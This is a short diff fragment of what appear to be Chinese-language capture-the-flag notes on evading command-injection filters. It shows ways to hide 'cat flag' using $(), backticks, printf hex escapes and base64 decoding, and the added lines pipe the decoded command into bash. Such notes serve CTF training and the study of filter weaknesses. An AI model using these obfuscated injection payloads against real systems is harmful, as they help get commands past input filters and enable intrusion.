@@ -47,3 +47,5 @@ $()/``搭配命令编码:通过将命令反编译执行后再交给执行函数�
     $(printf '\x63\x61\x74') /flag-->'\x63\x61\x74'=cat
     `printf '\x63\x61\x74\x20\x66\x6c\x61\x67'`-->`cat flag`
     $(echo Y2F0IGZsYWc=|base64 -d)-->cat flag
+管道符与bash和sh等搭配:
+    printf '\x63\x61\x74\x20\x66\x6c\x61\x67'|bash-->cat flag
